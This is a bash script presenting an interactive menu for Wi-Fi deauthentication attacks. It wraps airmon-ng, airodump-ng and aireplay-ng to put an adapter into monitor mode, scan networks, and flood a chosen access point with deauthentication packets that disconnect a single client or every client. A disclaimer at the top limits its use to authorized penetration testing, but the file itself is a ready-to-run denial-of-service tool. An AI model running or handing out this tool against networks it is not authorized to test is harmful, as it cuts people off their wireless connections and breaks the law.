#!/bin/bash

# Wi-Fi Deauthentication Tool
# Disclaimer: This tool is for educational and authorized penetration testing purposes only.
# Unauthorized use is illegal. Ensure you have permission before testing any network.

display_menu() {
    echo "------------------------------------"
    echo "Wi-Fi Deauthentication Tool"
    echo "1. Scan for Wi-Fi networks"
    echo "2. Select a Wi-Fi network for further actions"
    echo "3. Deauthenticate a client from a Wi-Fi network"
    echo "4. Deauthenticate all clients from a Wi-Fi network"
    echo "5. Check Wi-Fi Adapter Status"
    echo "6. Change Wi-Fi Adapter Interface Name"
    echo "7. Enable Monitor Mode"
    echo "8. Disable Monitor Mode"
    echo "9. Exit"
    echo ""
    echo "Enter your choice:"
    read -r choice
}

validate_bssid() {
    local bssid="$1"
    if [[ ! "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        echo "Invalid BSSID format. Please use the format XX:XX:XX:XX:XX:XX."
        return 1
    fi
    return 0
}

validate_mac() {
    local mac="$1"
    if [[ ! "$mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        echo "Invalid MAC address format. Please use the format XX:XX:XX:XX:XX:XX."
        return 1
    fi
    return 0
}

validate_channel() {
    local channel="$1"
    if [[ ! "$channel" =~ ^[0-9]+$ ]] || (( channel < 1 || channel > 14 )); then
        echo "Invalid channel. Please enter a number between 1 and 14."
        return 1
    fi
    return 0
}

scan_wifi() {
    echo "Scanning for Wi-Fi networks..."
    if ! airodump-ng "$wifi_interface"; then
        echo "Failed to scan Wi-Fi networks. Ensure your adapter is in monitor mode."
    fi
}

select_wifi() {
    echo "Enter the BSSID of the Wi-Fi network:"
    read -r wifi_bssid
    if ! validate_bssid "$wifi_bssid"; then
        return
    fi

    echo "Enter the channel of the Wi-Fi network:"
    read -r channel
    if ! validate_channel "$channel"; then
        return
    fi

    echo "Starting monitoring on the selected network..."
    if ! airodump-ng --bssid "$wifi_bssid" --channel "$channel" "$wifi_interface"; then
        echo "Failed to start monitoring. Ensure your adapter is in monitor mode."
    fi
}

deauth_client() {
    echo "Enter the number of deauthentication packets to send:"
    read -r deauth_packets
    if [[ ! "$deauth_packets" =~ ^[0-9]+$ ]]; then
        echo "Invalid number of packets. Please enter a positive integer."
        return
    fi

    echo "Enter the BSSID of the Wi-Fi network:"
    read -r wifi_bssid
    if ! validate_bssid "$wifi_bssid"; then
        return
    fi

    echo "Enter the client MAC address to deauthenticate:"
    read -r client_mac
    if ! validate_mac "$client_mac"; then
        return
    fi

    echo "Sending deauthentication packets..."
    if ! aireplay-ng --deauth "$deauth_packets" -a "$wifi_bssid" -c "$client_mac" "$wifi_interface"; then
        echo "Failed to send deauthentication packets."
    fi
}

deauth_all_clients() {
    echo "Enter the number of deauthentication packets to send:"
    read -r deauth_packets
    if [[ ! "$deauth_packets" =~ ^[0-9]+$ ]]; then
        echo "Invalid number of packets. Please enter a positive integer."
        return
    fi

    echo "Enter the BSSID of the Wi-Fi network:"
    read -r wifi_bssid
    if ! validate_bssid "$wifi_bssid"; then
        return
    fi

    echo "Sending deauthentication packets to all clients..."
    if ! aireplay-ng --deauth "$deauth_packets" -a "$wifi_bssid" "$wifi_interface"; then
        echo "Failed to send deauthentication packets."
    fi
}

check_wifi() {
    echo "Wi-Fi Adapter Status"
    if ! iwconfig "$wifi_interface"; then
        echo "Failed to check adapter status. Ensure the interface name is correct."
    fi
}

change_interface() {
    echo "Enter the new Wi-Fi adapter interface name:"
    read -r new_interface
    if [[ -z "$new_interface" ]]; then
        echo "Interface name cannot be empty."
        return
    fi
    wifi_interface="$new_interface"
    echo "Wi-Fi adapter interface name changed to $wifi_interface."
}

enable_monitor_mode() {
    echo "Putting $wifi_interface into monitor mode..."
    if airmon-ng start "$wifi_interface"; then
        wifi_interface="${wifi_interface}mon"
        echo "Interface set to $wifi_interface (monitor mode)."
    else
        echo "Failed to enable monitor mode."
    fi
}

disable_monitor_mode() {
    echo "Disabling monitor mode..."
    if airmon-ng stop "$wifi_interface"; then
        wifi_interface="${wifi_interface%mon}"
        echo "Interface set to $wifi_interface (managed mode)."
    else
        echo "Failed to disable monitor mode."
    fi
}

wifi_interface="wlan0"

while true; do
    display_menu

    case $choice in
        1)
            scan_wifi
            ;;
        2)
            select_wifi
            ;;
        3)
            deauth_client
            ;;
        4)
            deauth_all_clients
            ;;
        5)
            check_wifi
            ;;
        6)
            change_interface
            ;;
        7)
            enable_monitor_mode
            ;;
        8)
            disable_monitor_mode
            ;;
        9)
            echo "Exiting..."
            break
            ;;
        *)
            echo "Invalid choice. Please try again."
            ;;
    esac

    echo
done
